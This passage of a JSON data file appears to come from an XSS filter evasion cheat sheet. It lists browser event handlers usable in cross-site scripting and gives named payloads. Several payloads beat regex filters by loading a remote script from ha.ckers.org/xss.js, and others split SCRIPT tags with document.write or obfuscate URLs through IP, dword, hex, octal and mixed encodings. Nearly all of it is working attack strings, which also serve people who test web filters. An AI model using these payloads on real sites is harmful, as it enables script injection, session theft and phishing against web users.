      "description" : "Event Handlers that can be used in XSS attacks (this is the most comprehensive list on the net, at the time of this writing). Each one may have different results in different browsers. Thanks to Rene Ledosquet (http://www.secaron.de/) for the HTML+TIME updates:\n\t\t\t\n-FSCommand() (execute from within an embedded Flash object)\n\n-onAbort() (when user aborts the loading of an image)\n\n-onActivate() (when object is set as the active element)\n\n-onAfterPrint() (activates after user prints or previews print job)\n\n-onAfterUpdate() (activates on data object after updating data in the source object)\n\n-onBeforeActivate() (fires before the object is set as the active element)\n\n-onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard (use the execCommand(\"Copy\") function)\n\n-onBeforeCut() (attacker executes the attack string right before a selection is cut)\n\n-onBeforeDeactivate() (fires right after the activeElement is changed from the current object)\n\n-onBeforeEditFocus() (fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)\n\n-onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand(\"Paste\") function)\n\n-onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand(\"Print\") function)\n\n-onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)\n\n-onBegin() (fires immediately when the element's timeline begins)\n\n-onBlur() (in the case where another popup is loaded and window loses focus)\n\n-onBounce() (fires when the behavior property of the marquee object is set to \"alternate\" and the contents of the marquee reach one side of the window)\n\n-onCellChange() (fires when data changes in the data provider)\n\n-onChange() (fires when select, text, or TEXTAREA field loses focus and its value has been modified)\n\n-onClick() (fires when someone clicks on a form)\n\n-onContextMenu() (user would need to right click on attack area)\n\n-onControlSelect() (fires when the user is about to make a control selection of the object)\n\n-onCopy() (user needs to copy something or it can be exploited using the execCommand(\"Copy\") command)\n\n-onCut() (user needs to copy something or it can be exploited using the execCommand(\"Cut\") command)\n\n-onDataAvailible() (user would need to change data in an element, or attacker could perform the same function)\n\n-onDataSetChanged() (fires when the data set exposed by a data source object changes)\n\n-onDataSetComplete() (fires to indicate that all data is available from the data source object)\n\n-onDblClick() (fires when user double-clicks a form element or a link)\n\n-onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)\n\n-onDrag() (requires that the user drags an object)\n\n-onDragEnd() (requires that the user drags an object)\n\n-onDragLeave() (requires that the user drags an object off a valid location)\n\n-onDragEnter() (requires that the user drags an object into a valid location)\n\n-onDragOver() (requires that the user drags an object into a valid location)\n\n-onDragDrop() (user drops an object (e.g. file) onto the browser window)\n\n-onDrop() (fires when user drops an object (e.g. file) onto the browser window)\n",
      "name" : "Event Handlers List 1",
      "vector" : "See Below"
   },
   {
      "description" : "-onEnd() (fires when the timeline ends.  This can be exploited, like most of the HTML+TIME event handlers by doing something like <P STYLE=\"behavior:url('#default#time2')\" onEnd=\"alert('XSS')\">)\n\t\t\t\n-onError() (loading of a document or image causes an error)\n\n-onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)\n\n-onFilterChange() (fires when a visual filter completes state change)\n\n-onFinish() (attacker could create the exploit when marquee is finished looping)\n\n-onFocus() (attacker executes the attack string when the window gets focus)\n\n-onFocusIn() (attacker executes the attack string when window gets focus)\n\n-onFocusOut() (attacker executes the attack string when window loses focus)\n\n-onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)\n\n-onKeyDown() (fires when user depresses a key)\n\n-onKeyPress() (fires when user presses or holds down a key)\n\n-onKeyUp() (fires when user releases a key)\n\n-onLayoutComplete() (user would have to print or print preview)\n\n-onLoad() (attacker executes the attack string after the window loads)\n\n-onLoseCapture() (can be exploited by the releaseCapture() method)\n\n-onMediaComplete() (when a streaming media file is used, this event could fire before the file starts playing)\n\n-onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)\n\n-onMouseDown() (the attacker would need to get the user to click on an image)\n\n-onMouseEnter() (fires when cursor moves over an object or area)\n\n-onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)\n\n-onMouseMove() (the attacker would need to get the user to mouse over an image or table)\n\n-onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)\n\n-onMouseOver() (fires when cursor moves over an object or area)\n\n-onMouseUp() (the attacker would need to get the user to click on an image)\n\n-onMouseWheel() (the attacker would need to get the user to use their mouse wheel)\n\n-onMove() (user or attacker would move the page)\n\n-onMoveEnd() (user or attacker would move the page)\n\n-onMoveStart() (user or attacker would move the page)\n\n-onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)\n\n-onPaste() (user would need to paste or attacker could use the execCommand(\"Paste\") function)\n\n-onPause() (fires on every element that is active when the timeline pauses, including the body element)\n\n-onProgress() (attacker would use this as a flash movie was loading)\n\n-onPropertyChange() (user or attacker would need to change an element property)\n\n-onReadyStateChange() (user or attacker would need to change an element property)\n",
      "name" : "Event Handlers List 2",
      "vector" : "See Below"
   },
   {
      "description" : "-onRepeat() (fires once for each repetition of the timeline, excluding the first full cycle)\n\t\t\t\n-onReset() (fires when user or attacker resets a form)\n\n-onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)\n\n-onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)\n\n-onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)\n\n-onResume() (fires on every element that becomes active when the timeline resumes, including the body element)\n\n-onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)\n\n-onRowEnter() (user or attacker would need to change a row in a data source)\n\n-onRowExit() (user or attacker would need to change a row in a data source)\n\n-onRowDelete() (user or attacker would need to delete a row in a data source)\n\n-onRowInserted() (user or attacker would need to insert a row in a data source)\n\n-onScroll() (user would need to scroll, or attacker could use the scrollBy() function)\n\n-onSeek() (fires when the timeline is set to play in any direction other than forward)\n\n-onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\");)\n\n-onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\");)\n\n-onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\");)\n\n-onStart() (fires at the beginning of each marquee loop)\n\n-onStop() (user would need to press the stop button or leave the webpage)\n\n-onSynchRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire)\n\n-onSubmit() (requires attacker or user submits a form)\n\n-onTimeError() (fires when user or attacker sets a time property, such as \"dur\", to an invalid value)\n\n-onTrackChange() (fires when user or attacker changes track in a playList)\n\n-onUnload() (fires when the user clicks any link or presses the back button or attacker forces a click)\n\n-onURLFlip() (fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)\n\n-seekSegmentTime() (locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)\n",
      "name" : "Event Handlers List 3",
      "vector" : "See Below"
   },
   {
      "description" : "For performing XSS on sites that allow \"<SCRIPT>\" but don't allow \"<SCRIPT SRC...\" by way of the following regex filter:\n\t/<script[^>]+src/i",
      "name" : "Evade Regex Filter 1",
      "vector" : "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "For performing XSS on sites that allow \"<SCRIPT>\" but don't allow \"<SCRIPT SRC...\" by way of a regex filter:\n\t/<script((\\s+\\w+(\\s*=\\s*(?:\"(.)*?\"|'(.)*?'|[^'\">\\s]+))?)+\\s*|\\s*)src/i\n\t\n(this is an important one, because I've seen this regex in the wild)",
      "name" : "Evade Regex Filter 2",
      "vector" : "<SCRIPT =\"blah\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "Another XSS to evade this regex filter:\n\t/<script((\\s+\\w+(\\s*=\\s*(?:\"(.)*?\"|'(.)*?'|[^'\">\\s]+))?)+\\s*|\\s*)src/i",
      "name" : "Evade Regex Filter 3",
      "vector" : "<SCRIPT a=\"blah\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "Yet another XSS to evade the same filter:\n\t/<script((\\s+\\w+(\\s*=\\s*(?:\"(.)*?\"|'(.)*?'|[^'\">\\s]+))?)+\\s*|\\s*)src/i \nThe only thing I've seen work against this XSS attack if you still want to allow <SCRIPT> tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags)",
      "name" : "Evade Regex Filter 4",
      "vector" : "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "And one last XSS attack (using grave accents) to evade this regex:\n\t/<script((\\s+\\w+(\\s*=\\s*(?:\"(.)*?\"|'(.)*?'|[^'\">\\s]+))?)+\\s*|\\s*)src/i",
      "name" : "Evade Regex Filter 5",
      "vector" : "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.",
      "name" : "Filter Evasion 1",
      "vector" : "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.",
      "name" : "Filter Evasion 2",
      "vector" : "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).",
      "name" : "IP Encoding",
      "vector" : "<A HREF=\"http://66.102.7.147/\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).",
      "name" : "URL Encoding",
      "vector" : "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).",
      "name" : "Dword Encoding",
      "vector" : "<A HREF=\"http://1113982867/\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).\nThe total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.",
      "name" : "Hex Encoding",
      "vector" : "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).\nPadding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...",
      "name" : "Octal Encoding",
      "vector" : "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).\nThe tabs and newlines only work if this is encapsulated with quotes.",
      "name" : "Mixed Encoding",
      "vector" : "<A HREF=\"h\ntt\tp://6&#09;6.000146.0x7.147/\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).\nProtocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like \"(ht|f)tp(s)?://\" (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the \"//\" to \"\\\\\". You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.",
      "name" : "Protocol Resolution Bypass",
      "vector" : "<A HREF=\"//www.google.com/\">XSS</A>"
   },
   {
      "description" : "Firefox uses Google's \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's \"keyword:\" protocol. You can concatenate several keywords by using something like the following \"keyword:XSS+RSnake\"",
      "name" : "Firefox Lookups 1",
      "vector" : "<A HREF=\"//google\">XSS</A>"
   },
   {
      "description" : "This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the \"feeling lucky\" function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.",
      "name" : "Firefox Lookups 2",
      "vector" : "<A HREF=\"http://ha.ckers.org@google\">XSS</A>"
   },
   {
      "description" : "This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the \"feeling lucky\" function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case \"google\").",
      "name" : "Firefox Lookups 3",
      "vector" : "<A HREF=\"http://google:ha.ckers.org\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).\nWhen combined with the above URL, removing \"www.\" will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly.",
      "name" : "Removing Cnames",
      "vector" : "<A HREF=\"http://google.com/\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed).",
      "name" : "Extra dot for Absolute DNS",
      "vector" : "<A HREF=\"http://www.google.com./\">XSS</A>"
   },
   {
      "description" : "URL string evasion (assuming \"http://www.google.com/\" is programmatically disallowed)\nJavaScript link location",
      "name" : "JavaScript Link Location",
      "vector" : "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>"
   },
   {
      "description" : "Content replace as an attack vector (assuming \"http://www.google.com/\" is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (\"java&#x26;#x09;script:\" was converted into \"java&#x09;script:\".",
      "name" : "Content Replace",
      "vector" : "<A HREF=\"http://www.gohttp://www.google.com/ogle.com/\">XSS</A>"
   }
]